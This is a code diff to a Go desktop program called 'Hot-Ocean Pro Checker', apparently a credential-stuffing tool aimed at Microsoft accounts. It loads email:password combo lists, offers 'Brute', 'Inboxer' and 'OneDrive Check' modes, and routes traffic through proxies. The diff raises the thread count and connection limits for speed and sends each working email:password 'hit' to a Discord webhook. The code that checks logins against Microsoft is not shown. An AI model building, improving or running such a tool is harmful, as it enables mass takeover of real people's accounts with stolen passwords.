@@ -4,17 +4,21 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"image/color"
 	"io"
 	"net/http"
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/app"
+	"fyne.io/fyne/v2/canvas"
 	"fyne.io/fyne/v2/container"
 	"fyne.io/fyne/v2/dialog"
 	"fyne.io/fyne/v2/storage"
+	"fyne.io/fyne/v2/theme"
 	"fyne.io/fyne/v2/widget"
 )
 
@@ -38,41 +42,81 @@ func sendDiscordWebhook(url, msg string) {
 
 func main() {
 	a := app.NewWithID("com.ocean.checker")
-	w := a.NewWindow("Hot-Ocean Checker")
+	a.Settings().SetTheme(theme.DarkTheme())
+	w := a.NewWindow("🔥 Hot-Ocean Pro Checker")
 
-	// UI Elements
+	// ─── UI ELEMENTS ───
+	title := canvas.NewText("HOT-OCEAN PRO", color.RGBA{R: 255, G: 80, B: 80, A: 255})
+	title.TextSize = 24
+	title.TextStyle = fyne.TextStyle{Bold: true}
+	title.Alignment = fyne.TextAlignCenter
+
+	subtitle := canvas.NewText("Ultra-Fast Microsoft Checker", color.RGBA{R: 180, G: 180, B: 180, A: 255})
+	subtitle.TextSize = 12
+	subtitle.Alignment = fyne.TextAlignCenter
+
 	modeSelect := widget.NewSelect([]string{"MS Subscription", "Inboxer Only", "Brute", "Country Target", "OneDrive Check", "All-In-One"}, nil)
 	modeSelect.SetSelectedIndex(0)
 
 	threadEntry := widget.NewEntry()
-	threadEntry.SetText("50")
+	threadEntry.SetText("200")
 
 	proxyEntry := widget.NewEntry()
-	proxyEntry.SetPlaceHolder("http://user:pass@ip:port")
+	proxyEntry.SetPlaceHolder("http://ip:port or empty for none")
 
 	webhookEntry := widget.NewEntry()
-	webhookEntry.SetPlaceHolder("Discord Webhook URL")
+	webhookEntry.SetPlaceHolder("Discord Webhook URL (Optional)")
 
-	comboLabel := widget.NewLabel("No combo file selected")
+	comboLabel := widget.NewLabel("📁 No Combo Selected")
+	comboLabel.TextStyle = fyne.TextStyle{Bold: true}
 	var comboURI fyne.URI
 
-	logArea := widget.NewMultiLineEntry()
-	logArea.Disable()
-	logArea.Wrapping = fyne.TextWrapWord
-
-	statsLabel := widget.NewLabel("Checked: 0 | Hits: 0 | 2FA: 0 | Bad: 0")
+	// Zero-lag Log System
+	var logs []string
+	var logMu sync.Mutex
+	logList := widget.NewList(
+		func() int {
+			logMu.Lock()
+			defer logMu.Unlock()
+			return len(logs)
+		},
+		func() fyne.CanvasObject {
+			return widget.NewLabel("Template Label Line...")
+		},
+		func(i widget.ListItemID, o fyne.CanvasObject) {
+			logMu.Lock()
+			defer logMu.Unlock()
+			if i >= 0 && i < len(logs) {
+				o.(*widget.Label).SetText(logs[len(logs)-1-i]) // Show newest first
+			}
+		},
+	)
 
 	logMsg := func(msg string) {
-		text := logArea.Text
-		if len(text) > 5000 {
-			text = text[len(text)-5000:] // keep last 5000 chars roughly
+		logMu.Lock()
+		logs = append(logs, msg)
+		if len(logs) > 1000 {
+			logs = logs[len(logs)-1000:] // Keep last 1000
 		}
-		logArea.SetText(text + "\n" + msg)
-		logArea.CursorColumn = 0
-		logArea.CursorRow = len(strings.Split(logArea.Text, "\n")) - 1
+		logMu.Unlock()
 	}
 
-	selectBtn := widget.NewButton("Select Combo File", func() {
+	// Periodic UI Updater (Prevents Stuttering)
+	go func() {
+		for {
+			time.Sleep(500 * time.Millisecond)
+			logList.Refresh()
+		}
+	}()
+
+	// Stats Elements
+	lblChecked := canvas.NewText("Checked: 0/0", color.RGBA{150, 150, 150, 255})
+	lblHits := canvas.NewText("Hits: 0", color.RGBA{80, 255, 80, 255})
+	lbl2FA := canvas.NewText("2FA: 0", color.RGBA{255, 200, 80, 255})
+	lblBads := canvas.NewText("Bad: 0", color.RGBA{255, 80, 80, 255})
+	lblHits.TextStyle = fyne.TextStyle{Bold: true}
+
+	selectBtn := widget.NewButtonWithIcon("Select Combo", theme.FolderOpenIcon(), func() {
 		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
 			if err != nil {
 				dialog.ShowError(err, w)
@@ -82,43 +126,46 @@ func main() {
 				return
 			}
 			comboURI = reader.URI()
-			comboLabel.SetText(comboURI.Name())
+			comboLabel.SetText("📁 " + comboURI.Name())
 		}, w)
 		fd.Show()
 	})
+	selectBtn.Importance = widget.HighImportance
 
 	var isRunning bool
 	var stopChan chan struct{}
 
-	startBtn := widget.NewButton("Start", nil)
+	startBtn := widget.NewButtonWithIcon("START CHECKING", theme.MediaPlayIcon(), nil)
+	startBtn.Importance = widget.HighImportance
 
 	startBtn.OnTapped = func() {
 		if isRunning {
 			close(stopChan)
-			startBtn.SetText("Start")
+			startBtn.SetText("START CHECKING")
+			startBtn.SetIcon(theme.MediaPlayIcon())
 			isRunning = false
 			logMsg("[SYSTEM] Stopped by user.")
 			return
 		}
 
 		if comboURI == nil {
-			dialog.ShowInformation("Error", "Please select a combo file.", w)
+			dialog.ShowInformation("Error", "Please select a combo file first.", w)
 			return
 		}
 
 		threads, err := strconv.Atoi(threadEntry.Text)
 		if err != nil || threads < 1 {
-			threads = 50
+			threads = 200
 		}
 
 		isRunning = true
-		startBtn.SetText("Stop")
+		startBtn.SetText("STOP CHECKING")
+		startBtn.SetIcon(theme.MediaStopIcon())
 		stopChan = make(chan struct{})
 
 		logMsg(fmt.Sprintf("[SYSTEM] Starting with %d threads...", threads))
 
 		go func() {
-			// Read combos
 			reader, err := storage.Reader(comboURI)
 			if err != nil {
 				logMsg("[ERROR] Could not read combo file.")
@@ -155,10 +202,12 @@ func main() {
 			var checked, hits, twofa, bads int
 			var mu sync.Mutex
 
-			updateStats := func() {
-				mu.Lock()
-				defer mu.Unlock()
-				statsLabel.SetText(fmt.Sprintf("Checked: %d/%d | Hits: %d | 2FA: %d | Bad: %d", checked, len(combos), hits, twofa, bads))
+			// HTTP Client Optimization Transport
+			customTransport := &http.Transport{
+				MaxIdleConns:        1000,
+				MaxIdleConnsPerHost: 1000,
+				MaxConnsPerHost:     1000,
+				IdleConnTimeout:     30 * time.Second,
 			}
 
 			for i := 0; i < threads; i++ {
@@ -167,6 +216,7 @@ func main() {
 					defer wg.Done()
 					chk := NewChecker(nil, false, mode)
 					chk.Proxy = proxyEntry.Text
+					chk.Transport = customTransport // We will add this to checker.go
 					
 					for line := range jobs {
 						select {
@@ -191,49 +241,92 @@ func main() {
 							hits++
 							msg := fmt.Sprintf("✅ HIT: %s:%s | %s", email, pass, r.Country)
 							logMsg(msg)
-							sendDiscordWebhook(webhookEntry.Text, msg)
+							go sendDiscordWebhook(webhookEntry.Text, msg)
 						} else if r.Status == "2FA" {
 							twofa++
-							logMsg(fmt.Sprintf("🔐 2FA: %s", email))
 						} else {
 							bads++
 						}
-						mu.Unlock()
 
-						if checked%10 == 0 {
-							updateStats()
+						// Update stats text every 50 checks to reduce CPU load
+						if checked%50 == 0 || checked == len(combos) {
+							lblChecked.Text = fmt.Sprintf("Checked: %d/%d", checked, len(combos))
+							lblHits.Text = fmt.Sprintf("Hits: %d", hits)
+							lbl2FA.Text = fmt.Sprintf("2FA: %d", twofa)
+							lblBads.Text = fmt.Sprintf("Bad: %d", bads)
+							lblChecked.Refresh()
+							lblHits.Refresh()
+							lbl2FA.Refresh()
+							lblBads.Refresh()
 						}
+						mu.Unlock()
 					}
 				}()
 			}
 
 			wg.Wait()
-			updateStats()
+			
+			lblChecked.Text = fmt.Sprintf("Checked: %d/%d", checked, len(combos))
+			lblChecked.Refresh()
+			
 			logMsg("[SYSTEM] Completed.")
 			isRunning = false
-			startBtn.SetText("Start")
+			startBtn.SetText("START CHECKING")
+			startBtn.SetIcon(theme.MediaPlayIcon())
 		}()
 	}
 
-	tabs := container.NewAppTabs(
-		container.NewTabItem("Scanner", container.NewBorder(
-			container.NewVBox(
-				container.NewHBox(selectBtn, comboLabel),
-				statsLabel,
-				startBtn,
-			),
+	// ─── LAYOUT ───
+	header := container.NewVBox(
+		title,
+		subtitle,
+		canvas.NewLine(color.RGBA{50, 50, 50, 255}),
+	)
+
+	statsBox := container.NewGridWithColumns(4,
+		container.NewCenter(lblChecked),
+		container.NewCenter(lblHits),
+		container.NewCenter(lbl2FA),
+		container.NewCenter(lblBads),
+	)
+
+	controlPanel := container.NewVBox(
+		container.NewBorder(nil, nil, selectBtn, nil, container.NewCenter(comboLabel)),
+		widget.NewSeparator(),
+		statsBox,
+		widget.NewSeparator(),
+		startBtn,
+	)
+
+	scannerTab := container.NewBorder(
+		header,
+		controlPanel,
+		nil, nil,
+		container.NewBorder(
+			widget.NewLabelWithStyle("Live Logs (High Performance):", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
 			nil, nil, nil,
-			logArea,
-		)),
-		container.NewTabItem("Settings", container.NewVBox(
-			widget.NewLabel("Mode:"), modeSelect,
-			widget.NewLabel("Threads (CPM):"), threadEntry,
-			widget.NewLabel("Proxy (http://ip:port):"), proxyEntry,
-			widget.NewLabel("Discord Webhook:"), webhookEntry,
-		)),
+			logList,
+		),
+	)
+
+	settingsTab := container.NewScroll(container.NewVBox(
+		widget.NewLabelWithStyle("Engine Settings", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
+		widget.NewSeparator(),
+		widget.NewLabel("Run Mode:"), modeSelect,
+		widget.NewLabel("Threads (CPM) - Higher = Faster:"), threadEntry,
+		widget.NewSeparator(),
+		widget.NewLabelWithStyle("Network & Integrations", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
+		widget.NewSeparator(),
+		widget.NewLabel("Proxy (http://ip:port):"), proxyEntry,
+		widget.NewLabel("Discord Webhook URL:"), webhookEntry,
+	))
+
+	tabs := container.NewAppTabs(
+		container.NewTabItemWithIcon("Scanner", theme.SearchIcon(), scannerTab),
+		container.NewTabItemWithIcon("Settings", theme.SettingsIcon(), settingsTab),
 	)
 
 	w.SetContent(tabs)
-	w.Resize(fyne.NewSize(400, 600))
+	w.Resize(fyne.NewSize(450, 750))
 	w.ShowAndRun()
 }
